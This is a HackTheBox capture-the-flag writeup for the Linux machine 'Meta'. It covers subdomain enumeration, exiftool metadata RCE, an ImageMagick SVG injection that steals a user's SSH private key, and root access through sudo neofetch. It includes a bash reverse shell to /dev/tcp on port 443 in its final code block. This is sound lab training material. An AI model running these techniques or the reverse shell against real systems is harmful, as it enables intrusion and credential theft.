# Meta HackTheBox Writeup
### Level: `Medium` | OS: `Linux`

![logo](1.png)

## Scanning
We run **nmap** on all ports with scripts and software versions. We see that the web service redirects to the domain *artcorp.htb*, we insert it in our */etc/hosts* file.

![](2.png)


## Enumeration
We tested access at both sites, but they lead to the same destination.

![](3.png)

##### Viewing website:
![](4.png)

We list three possible relevant users in the company:

![](5.png)

We also see that they are promoting a new product called "*MetaView*" (the machine is called Meta, so it could be a clue).

![](6.png)

We launch the **wfuzz** tool and enumerate a subdomain "*dev01.artcorp.htb*":

![](7.png)

We access the website, find a link to the tool they are developing.

![](8.png)


## Exploitation
There appears to be a file upload field and it displays metadata. 

![](9.png)

If we look at the result, it is very similar to the output of the **exiftool**:

![](10.png)

#### Exploit: [https://github.com/OneSecCyber/JPEG_RCE](https://github.com/OneSecCyber/JPEG_RCE)

We perform the same process of the exploit and insert a system command (*"ls -lna"*) in the image metadata:

![](11.png)

We upload the image and see that the command is executed on the machine:

![](12.png)

Since we had to put all the code in the metadata, I found it easier to encode the payload in **base64**.

![](13.png)

We insert the **base64** payload, add decoding and execution on the victim machine:

![](14.png)

We listen in with a **netcat** and gain access to the machine:

![](15.png)

We tried to read the user flag, but we do not have permissions.

![](16.png)

We run **pspy** and see that a script called "*convert_images.sh*" is executed:

![](17.png)

#### Visualizing content:
The script takes the inserted content of the path "*/var/www/dev01.artcorp.htb/convert_images/*" and executes it with mogrify accepting any file:

![](18.png)

Searching for the "**mogrify**" binary, I found a lot of information about "**ImageMagick**", which allows you to execute commands through an XML file.

So I checked the version and did some research:

![](19.png)

So, I used the following file to copy the SSH private key of the user "*thomas*" and inserted it in a m3.svg file in the path "*/var/www/dev01.artcorp.htb/convert_images/*" and we only had to wait for the script to run it in a few minutes.

![](20.png)

We wait a few minutes and see that we have obtained the "*id_rsa*" file of the user *Thomas*:

![](22.png)

## Privilege Escalation
We connect via **SSH** with the private key and read the user flag.

We also see that we can run as the root user the "**neofetch**" binary.

![](23.png)

We searched [gtfobins/neofetch/](https://gtfobins.github.io/gtfobins/neofetch/) and found ways to exploit this binary.

![](26.png)

We can see that there is a configuration file for this binary in our folder.

![](24.png)

We insert our reverse shell into our neofetch configuration file:

![](25.png)

We put a **netcat** listening on port 443 and execute the two commands through the terminal. We will gain root access and read the flag.

### Explotation code:
```bash
# Reverse shell /home/thomas/.config/neofetch/config.php
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.XX.XX/443 0>&1"

# Terminal execution
export XDG_CONFIG_HOME="$HOME/.config"
sudo -u root /usr/bin/neofetch \"\" 
```

![](27.png)

---
## About

David Utón is Penetration Tester and security auditor for web and mobiles applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks.

#### Contacted on:

<img src='https://m3n0sd0n4ld.github.io/imgs/linkedin.png' width='40' align='center'> [David-Uton](https://www.linkedin.com/in/david-uton/)
<img src='https://m3n0sd0n4ld.github.io/imgs/twitter.png' width='43' align='center'> [@David_Uton](https://twitter.com/David_Uton)